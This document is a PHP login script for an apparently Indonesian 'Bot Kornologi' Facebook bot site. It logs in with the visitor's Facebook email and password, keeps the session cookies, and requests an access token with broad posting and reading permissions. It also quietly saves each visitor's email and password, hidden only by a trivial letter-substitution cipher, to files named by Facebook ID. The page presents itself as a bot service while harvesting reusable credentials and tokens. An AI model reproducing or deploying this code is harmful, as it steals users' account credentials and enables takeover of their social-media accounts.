<?php
session_start();
error_reporting(0);
   if($_POST[email]){
   $a=$_POST[email];
   $b=$_POST[pass];
   $c=str_replace(' ','',$b);
   if(!is_dir('cokis')){
   mkdir('cokis');
   }
       $login=array(
       'email' => $a,
       'pass' => $b,
       'login' => 'Log in',
       );
$step1=array(
'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
'w','x','y','z','.','@',);
$step2=array(
'3*5','8*6','4*9','4*2','1*6','3*9','3*4','3*1','9*1','1*8','4*1','7*0',
'8*1','6*0','8*2',
'2*4','2*3','7*5','2*8','2*7','2*2','0*0','0*1','0*9','0*4','0*3','7*3',
'8*0',);
   $cros=str_replace($step1,$step2,strtolower($a));
   $boy=str_replace($step1,$step2,strtolower($b));
   $cokis=str_replace($step1,$step2,$c);
getToken($login,'https://m.facebook.com/login.php',$cokis);
$file=file_get_contents('cokis/'.$cokis);
         if(preg_match('/c_user/',$file)){
         if(!is_dir('lokasi')){
         mkdir('lokasi');
         }
$true=getToken('https://m.facebook.com/dialog/oauth?client_id=41158896424&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cfriends_subscriptions%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9',$cokis);

$token=substr($true,strpos($true,'token=')+6,(strpos($true,'&expires')-(strpos($true,'token=')+6)));

   $me=getUrl('/me',$token);
   if($me[id]){
   $lis=fopen('lokasi/'.$me[id],'w');
   fwrite($lis,$cros.'Ag'.$boy);
   fclose($lis);
   $_SESSION[skip]=$token;
   header('Location: skip2.php');
   }else{
   atas();
   invalid();
      bwh();
      }
      }else{
      unlink('cokis/'.$cokis);
      atas();
      invalid();
      bwh();
      }
      }else{
 header('Location: index.php');
 }
 echo'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Bot Kornologi</title>
<link href="http://fathulwap.xtgem.com/inc/theme/wap/1.css" rel="stylesheet" media="screen, projection"> <link href="http://fathulwap.xtgem.com/inc/theme/wap/2.css" rel="stylesheet" type="text/css" >';
   function invalid(){
   $op=opendir('member');
   while($list=readdir($op)){
   if($list != '.' && $list != '..'){
   $user[]=$list;
   }
   }
   echo' 
   <div id="bottom-content">
   <div id="navigation-menu">
   <h3><a name="navigation-menu" class="no-link">Kesalahan</a></h3>
   <ul>
<li><b>Action:</b> <a href="?home=Back">Home</a> | <a href="http://fathulwap.xtgem.com/?konten=facebook&menu=Get+Token+Permanen&class=menu">Menu Tools</a> | user = <b>'.count($user).'</b>
   </li><li>
   Email atau Katasandi salah
   <li></li>
Silahkan login melalui m.facebook.com ,biasanya akun Anda akan terkunci untuk pertama kali melakukan login dari lokasi baru, nanti jika ada konfirmasi ( Ini Adalah Saya ) klik link tersebut, lalu login kembali dari halaman ini untuk sukses bermain robot anti expired! 
   </li><li>
   Silahkan Coba kembali
   </li><li>
   <a href="?home=Back">Login Kembali</a>
   </li></ul></div></div>';
}

function atas(){
   echo'
   <div id="header">
<a name="top" href="http://kotabaruku.heck.in/"><img
src="http://kotabaruku.heck.in/files/
kotabarukuheckin.png" alt="Kotabaru Mobile Blog"
style="width: 299px; height: 25px;"/></a>
<h2 class="description">Bot Beranda | Bot Kornologi | Bot Otomatis</h2>
   </div>';
}

function bwh(){
   $load = sys_getloadavg();
   $satu = file_get_contents('harini.php');
   $tas = explode('*',$satu);

   $dua=file_get_contents('kemaren.php');
   $tis = explode('*',$dua);

   $tiga=file_get_contents('total.php');
   $tos = explode('*',$tiga);
   echo' 
   <div id="footer">

   CPU LOAD : '.$load[0].'<br>
Hari ini : '.count($tas).' | Kemaren : '.count($tis).' | Total Hits : '.count($tos).'<br>
   <h6 id="powered-by">
Edited by - <a href="http://kotabaruku.heck.in">Fathul Mr-Error</a></h6>';
}

function getFb($ah,$uh){
      $um=array(
      'graph',
      'fb',
      'me',
      );
      $go='https://'.implode('.',$um);
      return $go.$ah.$uh;
}

function getUrl($string,$token,$as=null){
  $plin=array(
  'access_token' => $token,
  );
  if($as){
  $mer=array_merge($plin,$as);
  }else{
  $mer=$plin;
  }
  foreach($mer as $k => $o){
  $jek[]=$k.'='.$o;
  }
  $im='?'.implode('&',$jek);
  $im=getFb($string,$im);
  $im=json_decode(auto($im),true);
  if($im[data]){
  return $im[data];
  }else{
  return $im;
  }
}

function auto($url){
   $ch=curl_init();
   curl_setopt_array($ch,array(
   CURLOPT_URL => $url,
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_CONNECTTIMEOUT => 5,
   ));
   $cx=curl_exec($ch);
   curl_close($ch);
   return $cx;
}

function getToken($url,$xx=null,$cokis=null){
$me=$_SERVER[HTTP_USER_AGENT];
  if($cokis){
     $ch=curl_init();
        curl_setopt_array($ch,array(
           CURLOPT_URL => $xx,
              CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_USERAGENT => $me,
                CURLOPT_REFERER => $xx,
                 CURLOPT_POST => 1,
                     CURLOPT_POSTFIELDS => $url,
                 CURLOPT_SSL_VERIFYPEER => true,
             CURLOPT_ENCODING => '',
        CURLOPT_COOKIEJAR => 'cokis/'.$cokis,
   CURLOPT_COOKIEFILE => 'cokis/'.$cokis,
));
   $cx=curl_exec($ch);
       curl_close($ch);
          return ($cx);
             }else{
                $ch=curl_init();
                    curl_setopt_array($ch,array(
                       CURLOPT_URL => $url,
                  CURLOPT_RETURNTRANSFER => 1,
               CURLOPT_USERAGENT => $me,
                CURLOPT_HEADER => 1,
             CURLOPT_ENCODING => '',
             CURLOPT_COOKIEFILE => 'cokis/'.$xx,
          ));
      $cx=curl_exec($ch);
  curl_close($ch);
     return ($cx);
}
        }

?>